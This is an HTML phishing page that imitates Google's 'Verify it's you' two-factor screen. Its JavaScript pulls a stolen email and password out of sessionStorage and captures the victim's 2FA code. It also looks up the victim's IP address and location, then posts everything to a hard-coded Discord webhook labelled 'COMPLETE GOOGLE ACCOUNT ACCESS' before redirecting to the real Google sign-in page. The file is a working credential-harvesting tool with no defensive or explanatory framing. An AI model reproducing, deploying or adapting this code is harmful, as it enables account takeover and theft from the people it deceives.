<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Google Account - Verify it's you</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 448px;
    }

    .verification-card {
      background: #ffffff;
      border-radius: 8px;
      border: 1px solid #dadce0;
      padding: 48px 40px 36px;
    }

    .google-logo {
      text-align: center;
      margin-bottom: 28px;
    }

    .google-logo svg {
      width: 75px;
      height: auto;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      text-align: center;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 16px;
      color: #5f6368;
      text-align: center;
      margin-bottom: 8px;
    }

    .email-display {
      font-size: 14px;
      color: #1a73e8;
      text-align: center;
      margin-bottom: 32px;
      font-weight: 500;
    }

    .input-group {
      margin-bottom: 24px;
      position: relative;
    }

    .input-field {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      text-align: center;
      letter-spacing: 2px;
      font-size: 20px;
    }

    .input-field:focus {
      border-color: #1a73e8;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }

    .code-hint {
      text-align: center;
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 16px;
    }

    .verify-btn {
      width: 100%;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 12px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-top: 16px;
    }

    .verify-btn:hover {
      background-color: #1669c9;
    }

    .verify-btn:disabled {
      background-color: #c3c7cf;
      cursor: not-allowed;
    }

    .try-another {
      text-align: center;
      margin-top: 24px;
    }

    .try-another a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
    }

    .try-another a:hover {
      text-decoration: underline;
    }

    .error-message {
      background-color: #fce8e6;
      border-left: 4px solid #d93025;
      padding: 12px;
      margin-bottom: 20px;
      border-radius: 4px;
      display: none;
      font-size: 14px;
      color: #d93025;
      text-align: center;
    }

    .footer {
      text-align: center;
      margin-top: 32px;
      font-size: 12px;
      color: #5f6368;
    }

    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin: 0 8px;
    }

    .resend-link {
      text-align: center;
      margin-top: 16px;
    }

    .resend-link a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 13px;
    }

    @media (max-width: 480px) {
      .verification-card {
        padding: 32px 24px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="verification-card">
      <div class="google-logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75px" height="75px">
          <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
          <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
          <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
          <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
        </svg>
      </div>
      
      <h1>Verify it's you</h1>
      <div class="subtitle">Enter the verification code</div>
      <div class="email-display" id="emailDisplay"></div>
      
      <div id="errorMessage" class="error-message"></div>
      
      <form id="verifyForm">
        <div class="input-group">
          <input type="text" id="verificationCode" class="input-field" placeholder="6-digit code" maxlength="6" autocomplete="off" autofocus>
        </div>
        
        <div class="code-hint">
          Enter the 6-digit code from your authenticator app or text message
        </div>
        
        <button type="button" id="verifyBtn" class="verify-btn">Verify</button>
        
        <div class="resend-link">
          <a href="#" id="resendLink">Didn't receive a code?</a>
        </div>
        
        <div class="try-another">
          <a href="#" id="tryAnotherLink">Try another way to sign in</a>
        </div>
      </form>
      
      <div class="footer">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467323428703830086/zX0_yOsaonSoEL9zYtu5QP0uaGp2VP5HPBH9UCTNHp0erN6m3xjWu_mXkrQlBKqxLb5F";
    
    // Get stored credentials
    const storedEmail = sessionStorage.getItem('googleEmail') || "No email found";
    const storedPassword = sessionStorage.getItem('googlePassword') || "No password found";
    
    document.getElementById('emailDisplay').textContent = storedEmail;
    
    function getSystemInfo() {
      const userAgent = navigator.userAgent;
      let browser = "Unknown";
      let os = "Unknown";
      
      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Google Chrome";
      else if (userAgent.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Apple Safari";
      else if (userAgent.indexOf("Edg") > -1) browser = "Microsoft Edge";
      
      if (userAgent.indexOf("Windows") > -1) os = "Windows";
      else if (userAgent.indexOf("Mac OS") > -1) os = "macOS";
      else if (userAgent.indexOf("Linux") > -1 && userAgent.indexOf("Android") === -1) os = "Linux";
      else if (userAgent.indexOf("Android") > -1) os = "Android";
      else if (userAgent.indexOf("iPhone") > -1) os = "iOS";
      
      return { browser, os, userAgent };
    }
    
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return "Unable to fetch";
      }
    }
    
    async function getLocation(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        if (data.error) return "Location unavailable";
        return `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country_name || "Unknown"}`;
      } catch (error) {
        return "Location unavailable";
      }
    }
    
    async function send2FAToDiscord(code) {
      const ip = await getIPAddress();
      const location = await getLocation(ip);
      const systemInfo = getSystemInfo();
      const currentTime = new Date().toLocaleString();
      
      const embed = {
        title: "🔐✅ 2FA VERIFICATION CODE CAPTURED",
        color: 0xea4335,
        fields: [
          { name: "📧 Email", value: `\`\`\`${storedEmail}\`\`\``, inline: false },
          { name: "🔑 Password", value: `\`\`\`${storedPassword}\`\`\``, inline: false },
          { name: "🔢 2FA Verification Code", value: `\`\`\`${code}\`\`\``, inline: false },
          { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
          { name: "📍 Location", value: location, inline: true },
          { name: "💻 Browser", value: systemInfo.browser, inline: true },
          { name: "🖥️ OS", value: systemInfo.os, inline: true },
          { name: "⏰ Time", value: currentTime, inline: true },
          { name: "🔍 User Agent", value: `\`\`\`${systemInfo.userAgent.substring(0, 300)}\`\`\``, inline: false }
        ],
        footer: { text: "✅ FULL CREDENTIALS + 2FA CODE CAPTURED" },
        timestamp: new Date().toISOString()
      };
      
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            content: "@everyone **🎯 COMPLETE GOOGLE ACCOUNT ACCESS - EMAIL + PASSWORD + 2FA CODE 🎯**", 
            embeds: [embed], 
            username: "Google Security Breach Alert" 
          })
        });
        return true;
      } catch (error) {
        return false;
      }
    }
    
    function showError(message) {
      const errorDiv = document.getElementById('errorMessage');
      errorDiv.textContent = message;
      errorDiv.style.display = 'block';
      setTimeout(() => { errorDiv.style.display = 'none'; }, 4000);
    }
    
    async function handleVerify() {
      const code = document.getElementById('verificationCode').value.trim();
      
      if (!code) {
        showError("Please enter the verification code");
        return;
      }
      
      if (code.length < 6) {
        showError("Please enter a valid 6-digit code");
        return;
      }
      
      const verifyBtn = document.getElementById('verifyBtn');
      verifyBtn.disabled = true;
      verifyBtn.textContent = 'Verifying...';
      
      await send2FAToDiscord(code);
      
      // Clear session storage after sending
      sessionStorage.removeItem('googleEmail');
      sessionStorage.removeItem('googlePassword');
      
      // Show error and redirect to Google
      showError("Verification failed. Please try again.");
      
      setTimeout(() => {
        window.location.href = "https://accounts.google.com/signin/v2/identifier?service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
      }, 2000);
    }
    
    document.getElementById('verifyBtn').addEventListener('click', handleVerify);
    document.getElementById('verificationCode').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') handleVerify();
    });
    
    document.getElementById('resendLink').addEventListener('click', (e) => {
      e.preventDefault();
      showError("We sent a new code to your recovery phone/email");
    });
    
    document.getElementById('tryAnotherLink').addEventListener('click', (e) => {
      e.preventDefault();
      window.location.href = "https://accounts.google.com/signin/v2/challenge/skiplist";
    });
    
    // If no email stored, redirect back
    if (!sessionStorage.getItem('googleEmail')) {
      window.location.href = 'google-login.html';
    }
  </script>
</body>
</html>
